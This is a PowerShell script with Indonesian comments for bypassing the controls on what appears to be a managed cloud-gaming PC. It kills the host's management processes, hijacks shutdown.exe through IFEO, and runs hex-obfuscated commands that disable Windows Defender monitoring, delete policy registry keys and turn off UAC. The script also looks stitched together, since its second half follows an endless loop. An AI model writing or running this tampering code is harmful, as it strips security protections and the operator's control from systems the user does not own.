# ============================================
# BYPASS CLOUD MAGIC + ANTI SHUTDOWN
# Jalankan: klik kanan -> Run with PowerShell
# ============================================

Write-Host "============================================" -ForegroundColor Cyan
Write-Host " BYPASS CLOUD MAGIC - PowerShell Edition" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

# ============================================
# [1] KILL PROSES CLOUD/DALONG
# ============================================
Write-Host "`n[1] Mematikan proses cloud..." -ForegroundColor Yellow

$proses = @(
    "cloudgame",
    "PrrocessDlbdp",
    "PrccessDlbdp",
    "ProcessDlbdp",
    "AccountAssistantDaemon",
    "DL_2IMG69ZKLH",
    "DragonDaemon",
    "DragonServer",
    "DragonLauncher",
    "StreamManager",
    "StreamServer",
    "SaveManager_Client",
    "nxprun",
    "MountGameDrive",
    "OverSeasIcon",
    "MainDisplayOn2",
    "MonitorOperate",
    "geelevel"
)

foreach ($p in $proses) {
    $found = Get-Process -Name $p -ErrorAction SilentlyContinue
    if ($found) {
        Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
        Write-Host "  [OK] Killed: $p" -ForegroundColor Green
    }
}

Write-Host "  Done." -ForegroundColor Green

# ============================================
# [2] BERSIHKAN REGISTRY IFEO HIJACK
# ============================================
Write-Host "`n[2] Membersihkan registry IFEO hijack..." -ForegroundColor Yellow

$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

$targets = @("explorer.exe", "powershell.exe", "curl.exe", "cmd.exe")

foreach ($t in $targets) {
    $fullPath = "$ifeoPath\$t"
    if (Test-Path $fullPath) {
        $val = Get-ItemProperty -Path $fullPath -Name "Debugger" -ErrorAction SilentlyContinue
        if ($val) {
            Remove-ItemProperty -Path $fullPath -Name "Debugger" -Force -ErrorAction SilentlyContinue
            Write-Host "  [OK] Hapus Debugger di: $t" -ForegroundColor Green
        } else {
            Write-Host "  [--] Tidak ada Debugger di: $t" -ForegroundColor Gray
        }
    }
}

Write-Host "  Done." -ForegroundColor Green

# ============================================
# [3] ANTI SHUTDOWN / RESTART DARI PROSES LUAR
# ============================================
Write-Host "`n[3] Mengaktifkan Anti Shutdown..." -ForegroundColor Yellow

# Block shutdown.exe dan shutdown proses pakai IFEO -> redirect ke nul
$blockList = @("shutdown.exe")

foreach ($b in $blockList) {
    $regPath = "$ifeoPath\$b"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    # Redirect shutdown.exe ke notepad biar gak bisa dieksekusi otomatis
    Set-ItemProperty -Path $regPath -Name "Debugger" -Value "notepad.exe" -Force
    Write-Host "  [OK] Blocked: $b (dialihkan ke notepad)" -ForegroundColor Green
}

Write-Host "  Done." -ForegroundColor Green

# ============================================
# [4] MONITOR - Kill cloudgame kalau muncul lagi
# ============================================
Write-Host "`n[4] Monitor aktif - berjalan di background..." -ForegroundColor Yellow
Write-Host "  (Tekan CTRL+C untuk stop monitoring)" -ForegroundColor Gray
Write-Host ""

$killCount = 0
while ($true) {
    $killed = $false
    foreach ($p in $proses) {
        $found = Get-Process -Name $p -ErrorAction SilentlyContinue
        if ($found) {
            Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
            $killed = $true
            $killCount++
        }
    }
    if ($killed) {
        # Hapus baris sebelumnya dan update counter tanpa spam
        $pos = $Host.UI.RawUI.CursorPosition
        $Host.UI.RawUI.CursorPosition = New-Object System.Management.Automation.Host.Coordinates 0, ($pos.Y - 1)
        Write-Host "  [MONITOR] Proses dikill $killCount kali...         " -ForegroundColor Red
    }
    Start-Sleep -Seconds 3
}

# 1. Pastikan skrip berjalan sebagai Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Mengelabui UAC / Meminta elevasi admin tingkat tinggi..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# 2. Fungsi untuk menerjemahkan Hex dan menjalankan perintah
function Invoke-SecretBinary {
    param (
        [string]$HexString
    )
    try {
        # Mengubah teks biner (Hex) kembali menjadi perintah asli
        $Bytes = for($i = 0; $i -lt $HexString.Length; $i += 2) { [Convert]::ToByte($HexString.Substring($i, 2), 16) }
        $PerintahAsli = [System.Text.Encoding]::UTF8.GetString($Bytes)
        
        # Menjalankan perintah di latar belakang secara senyap
        Invoke-Expression $PerintahAsli | Out-Null
    }
    catch {
        # Mengabaikan error seperti skrip asli
    }
}

# 3. Tampilan Utama
Clear-Host
Write-Host "==========================================================================="
Write-Host "   CORE OVERRIDER OBFUSCATED EDITION - BYKENNO v22.0 [ANTI-BLOCK] "
Write-Host "==========================================================================="
Write-Host "[*] Menyuntikkan kode bypass terenkripsi ke dalam memori RAM..."
Write-Host "[*] Membuka rantaian sistem dan melumpuhkan pengawas..."

# --- EKSEKUSI PERINTAH HEX ---

# 1. Matikan Real-time Monitoring Defender
Invoke-SecretBinary "706f7765727368656c6c202d4e6f50726f66696c65202d436f6d6d616e6420225365742d4d70507265666572656e6365202d44697361626c655265616c74696d654d6f6e69746f72696e6720247472756522"
Invoke-SecretBinary "706f7765727368656c6c202d4e6f50726f66696c65202d436f6d6d616e6420225365742d4d70507265666572656e6365202d44697361626c654265686176696f724d6f6e69746f72696e6720247472756522"

# 2. Hancurkan total semua folder registri pembatasan (Policies & DisallowRun)
$JalurAraiHex = @(
    "7265672064656c6574652022484b43555c536f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c506f6c696369657322202f66",
    "7265672064656c6574652022484b4c4d5c534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c506f6c696369657322202f66",
    "7265672064656c6574652022484b43555c536f6674776172655c506f6c696369657322202f66",
    "7265672064656c6574652022484b4c4d5c534f4654574152455c506f6c696369657322202f66"
)
foreach ($h in $JalurAraiHex) {
    Invoke-SecretBinary $h
}

# 3. Bypass UAC secara permanen (EnableLUA = 0)
Invoke-SecretBinary "726567206164642022484b4c4d5c534f4654574152455c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c506f6c69636965735c53797374656d22202f762022456e61626c654c554122202f74205245475f44574f5244202f642030202f66"

# 4. Dongkrak Bandwidth Internet & TCP Autotuning
Invoke-SecretBinary "6e6574736820696e74207463702073657420676c6f62616c206175746f74756e696e676c6576656c3d6e6f726d616c"
Invoke-SecretBinary "6970636f6e666967202f666c757368646e73"

# 5. Dongkrak Prioritas Proses Steam & Edge ke tingkat High Priority
Invoke-SecretBinary "776d69632070726f63657373207768657265206e616d653d22737465616d2e657865222043414c4c207365747072696f726974792022686967682070726f6365737322"
Invoke-SecretBinary "776d69632070726f63657373207768657265206e616d653d226d73656467652e657865222043414c4c207365747072696f726974792022686967682070726f6365737322"

# --- SELESAI EKSEKUSI ---

Write-Host ""
Write-Host "#################################################################" -ForegroundColor Green
Write-Host "  ✅ [BYKENNO v22.0 STATUS: MEMORI INJECTION SUKSES TOTAL]" -ForegroundColor Green
Write-Host "  [*] Proteksi berhasil dikelabui via enkripsi biner." -ForegroundColor Green
Write-Host "  [*] Akses penuh terbuka dan speed jaringan berhasil didongkrak." -ForegroundColor Green
Write-Host "#################################################################" -ForegroundColor Green

Write-Host "`n[*] Memuat ulang Windows Explorer..."
Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
Start-Process "explorer.exe"

Write-Host "`nJendela otomatis menutup dalam 5 detik..."
Start-Sleep -Seconds 5
